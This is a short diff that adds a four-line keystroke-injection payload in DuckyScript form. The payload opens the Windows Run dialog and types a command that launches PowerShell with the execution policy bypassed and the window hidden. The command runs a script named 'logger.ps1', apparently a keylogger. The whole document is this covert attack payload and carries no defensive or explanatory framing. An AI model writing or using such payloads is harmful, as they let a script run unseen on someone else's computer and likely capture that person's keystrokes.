@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\logger.ps1"
+ENTER
